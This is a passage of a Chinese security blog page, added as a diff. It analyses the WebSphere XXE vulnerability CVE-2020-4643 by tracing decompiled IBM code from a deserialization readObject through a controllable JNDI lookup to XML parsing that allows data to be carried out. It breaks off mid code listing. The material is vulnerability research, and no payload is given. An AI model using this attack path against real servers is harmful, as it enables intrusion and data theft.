@@ -1,0 +1,2887 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Longofo's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "be3d97bc"
+    });
+  daovoice('update');
+  </script>
+
+
+
+<meta name="description" content="小白 | 码渣 | 仰望 | 大佬">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Longofo&#39;s Blog">
+<meta property="og:url" content="http://longofo.cc/index.html">
+<meta property="og:site_name" content="Longofo&#39;s Blog">
+<meta property="og:description" content="小白 | 码渣 | 仰望 | 大佬">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Longofo&#39;s Blog">
+<meta name="twitter:description" content="小白 | 码渣 | 仰望 | 大佬">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://longofo.cc/"/>
+
+
+
+
+  <title>Longofo's Blog - 小白 | 码渣 | 仰望 | 大佬 </title>
+  <style>
+  .forkme{
+    display: none;
+  }
+  @media (min-width: 768px) {
+  .forkme{
+    display: inline;
+  }
+  }
+  </style>
+  
+
+
+
+
+
+
+
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/love.js"></script>
+  <!-- 背景动画 -->
+  <script type="text/javascript" src="/js/src/particle.js"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  
+  
+    
+  
+  
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+    <div class="forkme">
+      <a target="_blank" href="https://github.com/longofo"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_green_007200.png" alt="Fork me on GitHub">
+      </a>
+    </div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Longofo's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">与码农的不解之缘</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-bank"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-count">
+          <a href="/count/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-eye"></i> <br />
+            
+            琅琊榜
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/WebSphere XXE 漏洞分析(CVE-2020-4643).html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/WebSphere XXE 漏洞分析(CVE-2020-4643).html" itemprop="url">WebSphere XXE 漏洞分析(CVE-2020-4643)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-23T19:45:39+08:00">
+                2020-09-23
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-09-23T19:51:10+08:00">
+                2020-09-23
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/WebSphere XXE 漏洞分析(CVE-2020-4643).html" class="leancloud_visitors" data-flag-title="WebSphere XXE 漏洞分析(CVE-2020-4643)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote>
+
+<blockquote>
+<p>2020年9月17日，IBM发布了一个WebSphere XXE漏洞公告。 当时看到这个消息心想我们挖的那个XXE很可能与这个重了。然后看了下补丁，果不其然，当时心里就很遗憾，本来是打算一起找到一个RCE漏洞在一起提交XXE漏洞的，因为害怕提交了XXE官方把反序列化入口也封了，例如CVE-2020-4450，直接封掉了反序列化入口。奈何WebSphere找了一两周也没什么发现，后来正打算把XXE提交了，就看到官方发布了公告，看了下作者，是绿盟的一位大佬，也是CVE-2020-4450的发现者之一，这些默默挖洞的大佬，只可远观眺望啊。WebSphere的分析似乎挺少，聊聊几篇分析，不像Weblogic那样量产漏洞，单是一个高版本sdk就拦截了很多链或者说连接可用链的点，心想与其烂在手里，还不如分享出来，下面写下我们发现过程，其实重要的不是这个XXE，而是到达XXE这个点的前半部分。</p>
+</blockquote>
+<h3 id="WebSphere-XXE漏洞分析-CVE-2020-4643"><a href="#WebSphere-XXE漏洞分析-CVE-2020-4643" class="headerlink" title="WebSphere XXE漏洞分析(CVE-2020-4643)"></a>WebSphere XXE漏洞分析(CVE-2020-4643)</h3><p><strong>作者：Longofo@知道创宇404实验室 &amp; r00t4dm@奇安信A-TEAM</strong></p>
+<p><strong>时间：2020年9月21日</strong></p>
+<p>2020年9月17日，IBM发布了一个WebSphere XXE<a href="https://www.ibm.com/support/pages/security-bulletin-websphere-application-server-vulnerable-information-exposure-vulnerability-cve-2020-4643" target="_blank" rel="noopener">漏洞公告</a>。 当时看到这个消息心想我们挖的那个XXE很可能与这个重了。然后看了下补丁，果不其然，当时心里就很遗憾，本来是打算一起找到一个RCE漏洞在一起提交XXE漏洞的，因为害怕提交了XXE官方把反序列化入口也封了，例如CVE-2020-4450，直接封掉了反序列化入口。奈何WebSphere找了一两周也没什么发现，后来正打算把XXE提交了，就看到官方发布了公告，看了下作者，是绿盟的一位大佬，也是CVE-2020-4450的发现者之一，这些默默挖洞的大佬，只可远观眺望啊。WebSphere的分析似乎挺少，聊聊几篇分析，不像Weblogic那样量产漏洞，单是一个高版本sdk就拦截了很多链或者说连接可用链的点，心想与其烂在手里，还不如分享出来，下面写下我们发现过程，其实重要的不是这个XXE，而是到达XXE这个点的前半部分。</p>
+<h4 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h4><p>先来看看补丁，只能看出是修复了一个XXE，不知道是哪儿的XXE：</p>
+<p><img src="images/CVE-2020-4643/1.png" alt=""></p>
+<p>可以看出这里是修复了一个XXE漏洞，但是这只是一个Utils，我们找到的那个XXE刚好也用了这个Utils。</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>最开始研究WebSphere就是前不久的CVE-2020-4450，这个漏洞外面已经有分析了。为了更熟悉一点WebSphere，我们也去研究了历史补丁，例如印象比较深的就是前不久的CVE-2020-4276，这个漏洞算是历史漏洞CVE-2015-7450的认证方式绕过，RCE的过程与CVE-2015-7450没区别。后面意外的找到另一个反序列化入口，在确认了已经无法在历史漏洞上做文章的时，只好从readObject、readExternal、toString、compare等函数去尝试找下了，后来在一个readObject找到一个能JNDI注入的地方，但是由于sdk高版本的原因，能利用的方式就只能是本地factory或利用jndi本地反序列化了，但是WebSphere公开的利用链都被堵上了，本地反序列化其实没什么作用在这里，所以只剩下看本地Factory了。反序列化入口暂时先不给出，可能这样的反序列化入口还有很多，我们碰巧遇到了其中一个，如果后面有幸找到了RCE漏洞，就把我们找到的入口写出来，下面从那个readObject中的JNDI开始吧。</p>
+<p>在<code>com.ibm.ws.ejb.portable.EJBMetaDataImpl#readObject</code>中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in.defaultReadObject();</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">this</span>.ivStatelessSession = in.readBoolean();</span><br><span class="line">            ClassLoader loader = (ClassLoader)AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">this</span>.ivBeanClassName = in.readUTF();</span><br><span class="line">            <span class="keyword">this</span>.ivHomeClass = loader.loadClass(in.readUTF());</span><br><span class="line">            <span class="keyword">this</span>.ivRemoteClass = loader.loadClass(in.readUTF());</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.ivSession) &#123;</span><br><span class="line">                <span class="keyword">this</span>.ivPKClass = loader.loadClass(in.readUTF());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.ivHomeHandle = (HomeHandle)in.readObject();</span><br><span class="line">            EJBHome ejbHomeStub = <span class="keyword">this</span>.ivHomeHandle.getEJBHome();<span class="comment">//ivHomeHandle是一个接口，我们找到了HomeHandleImpl，里面进行了JNDI查询，并且url可控</span></span><br><span class="line">            <span class="keyword">this</span>.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ejbHomeStub, <span class="keyword">this</span>.ivHomeClass);<span class="comment">//如果跟踪过CVE-2020-4450就能感觉到，这里十分类似CVE-2020-4450，不过缺少了后续的调用，无法像CVE-2020-4450利用WSIF的方式触发后续的RCE，WSIF之前那个XXE也被修复了</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var6;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>com.ibm.ws.ejb.portable.HomeHandleImpl#getEJBHome</code>如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> EJBHome <span class="title">getEJBHome</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.ivEjbHome == <span class="keyword">null</span>) &#123;</span><br><span class="line">            NoSuchObjectException re;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">                InitialContext ctx;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.ivInitialContextProperties == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ctx = <span class="keyword">new</span> InitialContext(<span class="keyword">this</span>.ivInitialContextProperties);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">                            ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(<span class="keyword">this</span>.ivJndiName), homeClass);<span class="comment">//进行了JNDI查询，ivJndiName是属性，很容易控制</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoInitialContextException var6) &#123;</span><br><span class="line">                    Properties p = <span class="keyword">new</span> Properties();</span><br><span class="line">                    p.put(<span class="string">"java.naming.factory.initial"</span>, <span class="string">"com.ibm.websphere.naming.WsnInitialContextFactory"</span>);</span><br><span class="line">                    ctx = <span class="keyword">new</span> InitialContext(p);</span><br><span class="line">                    <span class="keyword">this</span>.ivEjbHome = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(<span class="keyword">this</span>.ivJndiName), homeClass);</span><br><span class="line">                &#125;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.ivEjbHome;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>如果是sdk低版本，直接就是外部加载factory rce利用了，但是天不随人愿，如果这么容易就不会有CVE-2020-4450那种复杂的利用了。</p>
+<p>接下来就只能一个一个看本地的factory了，也不多大概几十个，一个一个看吧。在<code>com.ibm.ws.webservices.engine.client.ServiceFactory#getObjectInstance</code>中，找到了那个XXE：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object refObject, Name name, Context nameCtx, Hashtable environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object instance = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refObject <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            Reference ref = (Reference)refObject;</span><br><span class="line">            RefAddr addr = ref.get(<span class="string">"service classname"</span>);</span><br><span class="line">            Object obj = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                instance = ClassUtils.forName((String)obj).newInstance();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                addr = ref.get(<span class="string">"WSDL location"</span>);</span><br><span class="line">                <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                    URL wsdlLocation = <span class="keyword">new</span> URL((String)obj);</span><br><span class="line">                    addr = ref.get(<span class="string">"service namespace"</span>);</span><br><span class="line">                    <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                        String namespace = (String)obj;</span><br><span class="line">                        addr = ref.get(<span class="string">"service local part"</span>);</span><br><span class="line">                        <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; (obj = addr.getContent()) <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                            String localPart = (String)obj;</span><br><span class="line">                            QName serviceName = QNameTable.createQName(namespace, localPart);</span><br><span class="line">                            Class[] formalArgs = <span class="keyword">new</span> Class[]&#123;URL.class, QName.class&#125;;</span><br><span class="line">                            Object[] actualArgs = <span class="keyword">new</span> Object[]&#123;wsdlLocation, serviceName&#125;;</span><br><span class="line">                            Constructor ctor = Service.class.getDeclaredConstructor(formalArgs);</span><br><span class="line">                            instance = ctor.newInstance(actualArgs);<span class="comment">//调用了Service构造函数</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            addr = ref.get(<span class="string">"maintain session"</span>);</span><br><span class="line">            <span class="keyword">if</span> (addr != <span class="keyword">null</span> &amp;&amp; instance <span class="keyword">instanceof</span> Service) &#123;</span><br><span class="line">                ((Service)instance).setMaintainSession(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>com.ibm.ws.webservices.engine.client.Service#Service(java.net.URL, javax.xml.namespace.QName)</code>，在构造函数中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Service</span><span class="params">(URL wsdlLocation, QName serviceName)</span> <span class="keyword">throws</span> ServiceException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">"Entry Service(URL, QName)  "</span> + serviceName.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.serviceName = serviceName;</span><br><span class="line">        <span class="keyword">this</span>.wsdlLocation = wsdlLocation;</span><br><span class="line">        Definition def = cachingWSDL ? (Definition)cachedWSDL.get(wsdlLocation.toString()) : <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (def == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Document doc = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                doc = XMLUtils.newDocument(wsdlLocation.toString());<span class="comment">//wsdlLocation外部可控，这里XMLUtils.newDocument进去就请求了wsdlLocation获取xml文件并解析</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                FFDCFilter.processException(var8, <span class="string">"com.ibm.ws.webservices.engine.client.Service.initService"</span>, <span class="string">"199"</span>, <span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(Messages.getMessage(<span class="string">"wsdlError00"</span>, <span class="string">""</span>, <span class="string">"\n"</span> + var8));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                WSDLFactory factory = <span class="keyword">new</span> WSDLFactoryImpl();</span><br><span class="line">                WSDLReader reader = factory.newWSDLReader();</span><br><span class="line">                reader.setFeature(<span class="string">"javax.wsdl.verbose"</span>, <span class="keyword">false</span>);</span><br><span class="line">                def = reader.readWSDL(wsdlLocation.toString(), doc);<span class="comment">//一开始我们只停留在了上面那个XMLUtils.newDocument，利用那儿的异常带不出去数据，由于是高版本sdk，外带也只能带一行数据。后来看到reader.readWSDL进去还能利用另一种方式外带全部数据</span></span><br><span class="line">                <span class="keyword">if</span> (cachingWSDL) &#123;</span><br><span class="line">                    cachedWSDL.put(wsdlLocation.toString(), def);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                FFDCFilter.processException(var7, <span class="string">"com.ibm.ws.webservices.engine.client.Service.initService"</span>, <span class="string">"293"</span>, <span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(Messages.getMessage(<span class="string">"wsdlError00"</span>, <span class="string">""</span>, <span class="string">"\n"</span> + var7));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.initService(def);</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">"Exit Service(URL, QName)  "</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>com.ibm.wsdl.xml.WSDLReaderImpl#readWSDL(java.lang.String, org.w3c.dom.Document)</code>之后，会调用到一个<code>com.ibm.wsdl.xml.WSDLReaderImpl#parseDefinitions</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 